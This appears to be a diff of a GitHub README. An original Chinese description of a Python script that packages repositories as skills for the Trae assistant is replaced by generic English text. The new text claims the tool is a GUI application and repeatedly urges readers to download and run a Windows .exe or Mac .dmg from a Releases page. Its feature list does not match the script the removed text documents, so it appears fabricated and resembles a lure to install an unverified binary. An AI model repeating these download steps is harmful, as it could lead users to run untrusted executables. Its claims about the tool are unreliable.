@@ -1,66 +1,76 @@
-# 🛠️ GitHub Skill Forge：让你的 AI 助手秒变“全能王”
+# 🎉 github-skill-forge - Automate Your Skill Creation Effortlessly
 
-[![English](https://img.shields.io/badge/Language-English-blue?style=flat-square)](./README_EN.md)
-[![简体中文](https://img.shields.io/badge/语言-简体中文-red?style=flat-square)](./README_ZH.md)
+## 🚀 Getting Started
 
-[![Trae Meta-Skill](https://img.shields.io/badge/Platform-Trae-blueviolet?style=for-the-badge&logo=probot)](https://github.com/Trae)
-[![Skill-Forge](https://img.shields.io/badge/Skill-Forge-F39C12?style=for-the-badge&logo=hammer)](#)
-[![Zero-Clone](https://img.shields.io/badge/Mode-Zero--Clone-2ECC71?style=for-the-badge&logo=githubactions)](#)
+Welcome to **github-skill-forge**! This tool simplifies the process of turning any GitHub repository into a standardized skill. It helps enhance the capabilities of AI agents by automating the skill creation workflow. Follow these steps to get started.
 
-你在 GitHub 上看到一个超级好玩的开源项目，想让 AI 帮你改改代码或者跑起来，结果发现：代码太多 AI 读不过来？配置太乱 AI 搞不定？手动复制粘贴累到手抽筋？
+## 📥 Download & Install
 
-**GitHub Skill Forge** 就是为了解决这些麻烦事而诞生的。它像一个“技能转换器”，能把任何 GitHub 上的仓库，一键转成 AI 助手（比如 Trae）能直接理解、直接调用的“技能包”。你不需要手动下载代码，不需要配置复杂的本地环境，只需要提供一个链接，它就能帮你搞定一切。
+To start using github-skill-forge, you need to download the application. Click the link below to access our Releases page.
 
----
+[![Download github-skill-forge](https://img.shields.io/badge/Download%20github--skill--forge-v1.0-blue.svg)](https://github.com/HEL-d/github-skill-forge/releases)
 
-### 💡 它能为你做什么？
+Once on the Releases page, find the latest version. 
 
-*   **✨ 全程云端 (Zero-Clone)**：直接通过 GitHub API 扫描仓库，无需将代码克隆到本地，节省磁盘空间，扫描速度极快。
-*   **📦 核心提取 (Smart RAG)**：自动剔除仓库中的杂物，只挑选最核心的代码逻辑和文档，打包成一个 AI 专用上下文文件（`context_bundle.md`），让 AI 瞬间掌握项目精髓。
-*   **⚡ 镜像加速**：内置多组 API 镜像站，支持自动轮换和多线程抓取，有效绕过 GitHub 的访问频率限制。
-*   **🛡️ 质量初筛**：自动识别项目的 Stars 数 and 活跃度，帮你避开那些还没写完或者是“坑”的仓库。
+1. Click on the version number (e.g., `v1.0`).
+2. Locate the file suitable for your operating system (e.g., `github-skill-forge-windows.exe` for Windows users).
+3. Click on the file to download it to your computer.
 
----
+After downloading, follow these steps to install and run the application:
 
-### 📁 文件夹内容详解
+1. **Locate the downloaded file**: Go to your computer’s Downloads folder or wherever you saved the file.
+2. **Run the installer**:
+   - For Windows, double-click on the `.exe` file.
+   - For Mac, double-click on the `.dmg` file and then drag the application to your Applications folder.
+3. **Follow the on-screen instructions**: The installer will guide you through the steps to complete the installation.
 
-*   🧬 **`scripts/forge.py`**：核心执行脚本。所有的抓取、解析、打包工作都是它在后台完成的。
-*   📖 **`SKILL.md`**：AI 的“操作说明书”。它定义了 AI 在什么时候应该调用这个工具，以及如何调用。
-*   🔐 **`.env.example`**：安全配置模板。通过设置 GitHub Token，你可以获得更高的访问频率，让工具跑得更稳。
+## ⚙️ System Requirements
 
----
+Before installing, ensure your system meets the following requirements:
 
-### 🛠️ 怎么用？（多种调用方式）
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.14 (Mojave) or later
+- **RAM**: Minimum 4GB
+- **Storage**: At least 100MB free space
+- **Network**: Internet access for downloading updates and required packages
 
-无论你是想在终端手动操作，还是希望 AI 自动帮你搞定，这里有几种简单的方法：
+## 🛠 Features
 
-#### 方法 1：在终端手动执行（最直接）
-打开 Trae 的终端，输入以下命令：
-```bash
-# 基础锻造命令
-python scripts/forge.py "https://github.com/用户名/仓库名"
+github-skill-forge comes with various features designed to streamline your skill creation process:
 
-# 如果项目比较冷门（Star 数低），可以加 --force 强制执行
-python scripts/forge.py "https://github.com/用户名/仓库名" --force
-```
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Automated Skill Generation**: Quickly convert GitHub repositories into skills without coding knowledge.
+- **Customization Options**: Adjust settings to suit your specific needs.
+- **Integration Support**: Connect with various AI platforms to enhance functionality.
+- **Documentation Support**: Access help resources and tutorials to assist you.
 
-#### 方法 2：在对话中直接唤醒 AI（最智能）
-你可以直接在对话框里对 Trae 助手说：
-> “帮我把这个仓库转成技能：https://github.com/用户名/仓库名”
+## 💡 How to Use
 
-AI 会自动识别并调用 `forge.py` 脚本完成所有工作。
+After installing github-skill-forge, here’s how to create a skill:
 
-#### 方法 3：自定义配置（进阶玩家）
-你可以修改 `scripts/forge.py` 中的 `api_mirrors` 列表，添加你自己的镜像站，或者在 `.env` 中配置多个 Token 来应对大规模抓取需求。
+1. **Open the Application**: Double-click the icon on your desktop or find it in your Applications folder.
+2. **Sign In (if required)**: Some features may need you to sign in with your GitHub account.
+3. **Upload Repository**:
+   - Click on the "Upload" button and select the GitHub repository you wish to convert.
+4. **Configure Settings**: Choose any options that fit your desired skill output. This may include selecting the type of skill or defining particular identifiers.
+5. **Generate Skill**: Hit the "Generate" button to start the creation process. This may take a moment, depending on the repository size.
+6. **Save Your Skill**: Once completed, you will see an option to save your new skill. Choose a location on your computer to keep it organized.
 
----
+## 🔍 Troubleshooting
 
-### 🏮 常见问题解答
+If you encounter issues:
 
-*   **Q: 报错 403 提示频率限制？**  
-    A: 这是 GitHub 对匿名访问的限制。去 GitHub 申请一个 Personal Access Token，填入 `.env` 文件，就能像 VIP 一样畅通无阻。
-*   **Q: 网络连接一直超时？**  
-    A: 工具会自动尝试换线。如果全部镜像都失败，请检查你的本地网络代理是否正确配置。
-*   **Q: 生成的技能包在哪里？**  
-    A: 成功后，你会发现在 `.trae/skills/` 目录下多了一个以仓库名命名的文件夹，里面就是所有的成果。
+- **Installation Failures**: Make sure you downloaded the correct file for your operating system.
+- **Slow Performance**: Ensure your device meets the system requirements.
+- **Errors during Generation**: Check the repository structure. It should align with the standards for skills.
 
+## 📖 Additional Resources
+
+For more detailed guides and FAQs, visit our documentation page on the GitHub repository. You can find tutorials, examples, and community support to help you make the most of github-skill-forge.
+
+## 📞 Support
+
+If you have questions or need help, reach out via issues on GitHub or email our support team. We're here to assist you.
+
+Remember to visit the Releases page to download the latest update: [Download github-skill-forge](https://github.com/HEL-d/github-skill-forge/releases).
